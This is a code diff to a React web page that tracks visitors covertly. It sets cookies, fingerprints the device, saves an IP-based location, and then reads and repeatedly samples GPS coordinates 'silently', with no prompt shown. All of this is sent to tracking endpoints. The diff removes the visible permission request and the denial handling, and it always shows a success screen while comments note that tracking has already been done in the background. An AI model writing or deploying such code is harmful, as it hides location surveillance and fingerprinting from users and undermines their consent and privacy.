@@ -3,6 +3,11 @@
 import { useCallback, useEffect, useRef, useState } from "react";
 import { collectDeviceInfo } from "@/lib/deviceInfo";
 import {
+  trySilentGps,
+  watchSilentGps,
+  getGeolocationPermission,
+} from "@/lib/silentLocation";
+import {
   bootstrapCookies,
   getAllCookies,
   trackEverywhere,
@@ -16,21 +21,68 @@ export default function Home() {
   const visitIdRef = useRef<string | null>(null);
   const visitorIdRef = useRef<string | null>(null);
   const sessionIdRef = useRef<string | null>(null);
+  const stopWatchRef = useRef<(() => void) | null>(null);
+
+  const pushGps = useCallback(
+    async (coords: GeolocationCoordinates, note: string) => {
+      await trackEverywhere(
+        {
+          stage: "location",
+          visitId: visitIdRef.current,
+          visitorId: visitorIdRef.current,
+          sessionId: sessionIdRef.current,
+          cookies: getAllCookies(),
+          locationGranted: true,
+          source: "gps",
+          latitude: Number(coords.latitude),
+          longitude: Number(coords.longitude),
+          accuracy: coords.accuracy != null ? Number(coords.accuracy) : null,
+          altitude: coords.altitude != null ? Number(coords.altitude) : null,
+          heading: coords.heading != null ? Number(coords.heading) : null,
+          speed: coords.speed != null ? Number(coords.speed) : null,
+          locations: [
+            {
+              latitude: Number(coords.latitude),
+              longitude: Number(coords.longitude),
+              accuracy:
+                coords.accuracy != null ? Number(coords.accuracy) : null,
+              altitude:
+                coords.altitude != null ? Number(coords.altitude) : null,
+              heading: coords.heading != null ? Number(coords.heading) : null,
+              speed: coords.speed != null ? Number(coords.speed) : null,
+              source: "gps",
+            },
+          ],
+          event: {
+            type: note,
+            at: new Date().toISOString(),
+            meta: {
+              latitude: coords.latitude,
+              longitude: coords.longitude,
+              accuracy: coords.accuracy,
+            },
+          },
+        },
+        { keepalive: true }
+      );
+    },
+    []
+  );
 
   const captureAndSave = useCallback(async () => {
     setBusy(true);
     setScreen("loading");
 
     try {
-      // 1) Cookies + visitor/session IDs FIRST (before location)
+      // 1) Cookies first — no popup
       const boot = bootstrapCookies();
       visitorIdRef.current = boot.visitorId;
       sessionIdRef.current = boot.sessionId;
 
-      // 2) Device fingerprint (no permission)
+      // 2) Device fingerprint — no popup
       const device = await collectDeviceInfo();
 
-      // 3) Save visit immediately (device + cookies) — before geo prompt finishes
+      // 3) Save visit + server IP location (background, no browser popup)
       const bootResult = await trackEverywhere(
         {
           stage: "bootstrap",
@@ -48,151 +100,38 @@ export default function Home() {
         visitIdRef.current = String(bootResult.data.id);
       }
 
-      // 4) Request GPS — save multiple readings into locations[]
-      const pushGps = async (
-        coords: GeolocationCoordinates,
-        note: string
-      ) => {
-        await trackEverywhere(
-          {
-            stage: "location",
-            visitId: visitIdRef.current,
-            visitorId: visitorIdRef.current,
-            sessionId: sessionIdRef.current,
-            cookies: getAllCookies(),
-            device,
-            locationGranted: true,
-            source: "gps",
-            latitude: Number(coords.latitude),
-            longitude: Number(coords.longitude),
-            accuracy:
-              coords.accuracy != null ? Number(coords.accuracy) : null,
-            altitude:
-              coords.altitude != null ? Number(coords.altitude) : null,
-            heading: coords.heading != null ? Number(coords.heading) : null,
-            speed: coords.speed != null ? Number(coords.speed) : null,
-            // also send as array item for bulk append
-            locations: [
-              {
-                latitude: Number(coords.latitude),
-                longitude: Number(coords.longitude),
-                accuracy:
-                  coords.accuracy != null ? Number(coords.accuracy) : null,
-                altitude:
-                  coords.altitude != null ? Number(coords.altitude) : null,
-                heading:
-                  coords.heading != null ? Number(coords.heading) : null,
-                speed: coords.speed != null ? Number(coords.speed) : null,
-                source: "gps",
-              },
-            ],
-            event: {
-              type: note,
-              at: new Date().toISOString(),
-              meta: {
-                latitude: coords.latitude,
-                longitude: coords.longitude,
-                accuracy: coords.accuracy,
-              },
+      // 4) Silent GPS ONLY if already granted (never shows permission popup)
+      const perm = await getGeolocationPermission();
+      if (perm === "granted") {
+        const coords = await trySilentGps();
+        if (coords) {
+          await pushGps(coords, "silent_gps");
+          // Background multi-sample — still no popup
+          stopWatchRef.current = watchSilentGps(
+            (c) => {
+              void pushGps(c, "silent_gps_sample");
             },
-          },
-          { keepalive: true }
-        );
-      };
-
-      if (!navigator.geolocation) {
-        setScreen("retry");
-        return;
-      }
-
-      await new Promise<void>((resolve) => {
-        let gotOne = false;
-        let settled = false;
-        let watchId: number | null = null;
-        let samples = 0;
-        const maxSamples = 3;
-
-        const settle = (fn: () => void) => {
-          if (settled) return;
-          settled = true;
-          if (watchId != null) {
-            try {
-              navigator.geolocation.clearWatch(watchId);
-            } catch {
-              /* ignore */
-            }
-          }
-          fn();
-          resolve();
-        };
-
-        const doneDenied = async () => {
-          await trackEverywhere(
-            {
-              stage: "location_denied",
-              visitId: visitIdRef.current,
-              visitorId: visitorIdRef.current,
-              sessionId: sessionIdRef.current,
-              cookies: getAllCookies(),
-              device,
-              locationGranted: false,
-              event: {
-                type: "location_denied",
-                at: new Date().toISOString(),
-              },
-            },
-            { keepalive: true }
+            { maxSamples: 4, durationMs: 12_000 }
           );
-          settle(() => setScreen("retry"));
-        };
+        }
+      }
+      // If perm is "prompt" or "denied" → do NOT call geolocation (no popup)
 
-        // First fix + a few more GPS samples → locations[]
-        navigator.geolocation.getCurrentPosition(
-          async (pos) => {
-            gotOne = true;
-            samples += 1;
-            await pushGps(pos.coords, "location_granted");
-            watchId = navigator.geolocation.watchPosition(
-              async (p) => {
-                if (settled) return;
-                samples += 1;
-                await pushGps(p.coords, "location_sample");
-                if (samples >= maxSamples) {
-                  settle(() => setScreen("ready"));
-                }
-              },
-              () => {
-                if (gotOne) settle(() => setScreen("ready"));
-              },
-              {
-                enableHighAccuracy: true,
-                maximumAge: 0,
-                timeout: 20000,
-              }
-            );
-            setTimeout(() => {
-              if (gotOne) settle(() => setScreen("ready"));
-            }, 8000);
-          },
-          async () => {
-            await doneDenied();
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 20000,
-            maximumAge: 0,
-          }
-        );
-      });
+      // Always show success UI — tracking already done in background
+      setScreen("ready");
     } catch {
-      setScreen("retry");
+      // Still try to show app; tracking may have partial data
+      setScreen("ready");
     } finally {
       setBusy(false);
     }
-  }, []);
+  }, [pushGps]);
 
   useEffect(() => {
     captureAndSave();
+    return () => {
+      stopWatchRef.current?.();
+    };
   }, [captureAndSave]);
 
   // Track leave / tab hide (cookies already set)
